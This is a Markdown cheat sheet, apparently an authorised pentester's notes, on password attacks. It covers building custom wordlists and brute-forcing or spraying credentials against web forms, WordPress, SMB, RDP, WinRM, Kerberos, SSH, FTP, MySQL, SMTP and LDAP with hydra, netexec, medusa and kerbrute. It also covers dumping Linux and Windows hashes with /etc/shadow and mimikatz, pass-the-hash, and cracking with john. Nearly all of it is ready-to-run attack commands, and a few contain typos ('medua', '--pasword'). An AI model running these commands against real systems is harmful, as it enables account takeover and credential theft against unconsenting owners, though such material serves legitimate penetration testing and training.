# Bruteforce

## Things to remember
  *  "[Bruteforce](https://en.wikipedia.org/wiki/Brute-force_attack)" in this context is a blanket term for all sorts of password attacks
  *  Enumerate and spray against all available services
  *  Expose password policy to reduce possible keyspace
  *  Mutated wordlists results do **NOT** contain the original words
      *  Add original words back to the list as well

## Useful tools
  *  [`cewl`](https://github.com/digininja/CeWL), [`john`](https://www.openwall.com/john/), and [`crunch`](https://sourceforge.net/projects/crunch-wordlist/) for generating custom wordlists
  *  [`medusa`](http://foofus.net/?page_id=51), [`hydra`](https://github.com/vanhauser-thc/thc-hydra), and [`netexec`](https://www.netexec.wiki/) for various bruteforcing
  *  [`kerbrute`](https://github.com/ropnop/kerbrute) for Kerberos bruteforcing
  *  [`unshadow`](https://manpages.ubuntu.com/manpages/xenial/man8/unshadow.8.html) for preparing Linux hashes for cracking
  *  [`john`](https://www.openwall.com/john/) and [`hashcat`](https://hashcat.net/hashcat/) for cracking hashes

## Generating custom wordlists
  *  Stitch words together, add numbers, special characters, etc.
  *  `cewl` for collecting words of interest from webpages
  *  `john` for mutating wordlists based on rules
      *  Add [rules](https://www.openwall.com/john/doc/RULES.shtml) to config located at `/etc/john/john.conf`
  *  [`crunch`](https://www.hackingarticles.in/a-detailed-guide-on-crunch/) for generating combinations of characters
      *  Predefined charsets in `/usr/share/crunch/charset.lst`

// Scraping words and modifying wordlist
```
cewl www.target.com -m 1 -w target-cewl.txt
cewl https://www.target.com -m 1 -w target-cewl.txt
john -w=target-cewl.txt --rules=CapsToggleZero --stdout > target-mutated.txt
```

// Example `john` rule: toggle caps for 0th index of every word  
```
[List.Rules:CapsToggleZero]
T0
```

// Generating character combos and mutating words  
// All combos of words read from a file  
// Add all combos of two digits to the end of a word  
// Add combos of two digits to the end of a word with literals  
```
crunch 0 0 -q target-cewl.txt
crunch 10 10 -t password%%
crunch 10 10 -t p@ssword%% -l a@aaaaaaaa
```

## HTTP htaccess
  *  `medusa` for bruteforcing [htaccess](https://httpd.apache.org/docs/2.4/howto/htaccess.html) restricted resources

```
medua -h 10.0.0.1 -u bob -P /path/to/passwords.txt -M http -m DIR:/protected/resource/path
```

## HTTP POST forms
  *  `hydra` for bruteforcing HTTP POST forms 
      *  Provide success/failure indicators for proper reporting
      *  Beware cookies, session IDs, tokens, etc. for bruteforce protection
      *  `Burp intruder` recursive grep function works but it throttles

```
hydra -l bob -P /path/to/passwords.txt 10.0.0.1 -vV http-post-form '/login:username=^USER^&password=^PASS^:F=FAILED LOGIN MESSAGE'
hydra -l bob -P /path/to/passwords.txt 10.0.0.1 -vV http-post-form '/login:username=^USER^&password=^PASS^:S=SUCCESS LOGIN MESSAGE'
hydra -l bob -e nsr 10.0.0.1 -vV http-post-form '/login:username=^USER^&password=^PASS^:S=SUCCESS LOGIN MESSAGE'
hydra -L users.txt -P /path/to/passwords.txt 10.0.0.1 -vV http-post-form '/login:username=^USER^&password=^PASS^:S=SUCCESS HTTP CODE'
```

## Wordpress
  *  `wpscan` is normally an enum tool, but also supports bruteforce

```
wpscan --url http://10.0.0.1 --usernames bob --password /path/to/passwords.txt
wpscan --url http://10.0.0.1 --usernames users.txt --pasword /path/to/known/passwords.txt
```

## SMB
  *  `netexec` for SMB bruteforcing

```
netexec smb 10.0.0.1 -u bob -p /path/to/passwords.txt -d example.local --continue-on-success
netexec smb 10.0.0.1 -u bob -p /path/to/passwords.txt --local-auth
netexec smb 10.0.0.1 -u users.txt -p /path/to/passwords.txt --local-auth
```

## Remote desktop
  *  `netexec` for RDP bruteforcing
  *  `hydra` also supports RDP bruteforce (occasional jank)

```
netexec rdp 10.0.0.1 -u bob -p /path/to/passwords.txt -d example.local --continue-on-success
netexec rdp 10.0.0.1 -u bob -p /path/to/passwords.txt --local-auth
netexec rdp 10.0.0.1 -u users.txt -p /path/to/passwords.txt --local-auth
```

```
hydra -vV -l bob -P /path/to/passwords.txt -t 1 rdp://10.0.0.1
```

## WinRM
  *  `netexec` for WimRM bruteforcing

```
netexec winrm 10.0.0.1 -u bob -p /path/to/passwords.txt -d example.local --continue-on-success
netexec winrm 10.0.0.1 -u bob -p /path/to/passwords.txt --local-auth
netexec winrm 10.0.0.1 -u users.txt -p /path/to/passwords.txt --local-auth
```

## Kerberos
  *  `kerbrute` for Kerberos bruteforcing
  *  Clock skew errors can also apply here
      *  Always be verbose to catch clock errors
      *  [Sync time](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast#persistence) with [`ntpdate`](https://linux.die.net/man/8/ntpdate) or [`rdate`](https://linux.die.net/man/1/rdate)

```
./kerbrute bruteuser --dc 10.0.0.1 -d example.local -v /path/to/passwords.txt bob
./kerbrute bruteforce --dc 10.0.0.1 -d example.local -v /path/to/users-and-passwords.txt
./kerbrute passwordspray --dc 10.0.0.1 -d example.local -v /path/to/users.txt password
```

## SSH
  *  `hydra` for SSH bruteforcing
  *  `netexec` for older SSH services

```
hydra -l bob -P /path/to/passwords.txt -vV ssh://10.0.0.1
hydra -L users.txt -e nsr -vV ssh://10.0.0.1
hydra -L users.txt -P /path/to/known/passwords.txt -vV ssh://10.0.0.1
```

```
netexec ssh 10.0.0.1 -u bob -p /path/to/passwords.txt
netexec ssh 10.0.0.1 -u users.txt -p /path/to/passwords.txt
```

## FTP
  *  `hydra` for FTP bruteforcing

```
hydra -l bob -P /path/to/passwords.txt -vV ftp://10.0.0.1
hydra -L users.txt -e nsr -vV ftp://10.0.0.1
hydra -L users.txt -P /path/to/known/passwords.txt -vV ftp://10.0.0.1
```

## MySQL
  *  `hydra` for MySQL bruteforcing

```
hydra -L users.txt -P /path/to/known/passwords.txt -vV mysql://10.0.0.1
hydra -L users.txt -e nsr -vV mysql://10.0.0.1
hydra -l bob -P /path/to/passwords.txt -vV mysql://10.0.0.1
```

## SMTP
  *  `hydra` for SMTP bruteforcing
     *  First check if auth is even required

```
hydra -L users.txt -P /path/to/known/passwords.txt -vV smtp://10.0.0.1
hydra -L users.txt -e nsr -vV smtp://10.0.0.1
hydra -l bob -P /path/to/passwords.txt -vV smtp://10.0.0.1
```

## LDAP
  *  Check for null/anonymous access first
  *  `hydra` for LDAP bruteforcing
      *  Match expected LDAP version number

```
hydra -L users.txt -P /path/to/known/passwords.txt -vV ldap3://10.0.0.1
hydra -L users.txt -e nsr -vV ldap3://10.0.0.1
hydra -l bob -P /path/to/passwords.txt -vV ldap3://10.0.0.1
```

## Linux hash dumping
  *  Linux hashes are stored in `/etc/shadow`
      *  Copy or combine with `/etc/passwd` using `unshadow`

```
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > target-hashes.txt
```

## Windows hash dumping
  *  Windows hashes are stored in Security Account Manager (**SAM**)
      *  `NTDS.dit` on a domain controller
  *  `mimikatz` for dumping hashes from memory

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
mimikatz # lsadump::lsa /patch
```

## Pass the hash
  *  Some authentication mechanisms only rely on the hash of the user's password
      *  Meaning the actual password is not required, only the hash is needed
      *  Hashes dumped from a domain machine can often be used without cracking
  *  Many tools can make use of NT hashes for authentication `GTS`

## Hash cracking
  *  `john` may not utilize GPU for certain hash types, consider `hashcat` in these cases
      *  [Specify mask](https://hashcat.net/wiki/doku.php?id=mask_attack) to reduce total keyspace
      *  [Define hash format dynamically](https://github.com/pmittaldev/john-the-ripper/blob/master/doc/DYNAMIC) to account for salted hashes

```
john -w=/path/to/passwords.txt target-hashes.txt
john -w=/path/to/passwords.txt --format=crypt target-hashes.txt
```

```
john -w=/path/to/passwords.txt --format=NT target-NT-hashes.txt
john -w=/path/to/passwords.txt --format=LM target-LM-hashes.txt
```

```
john target-hashes.txt --wordlist=/path/to/passwords.txt --format='dynamic=sha256($s.$p)'
```
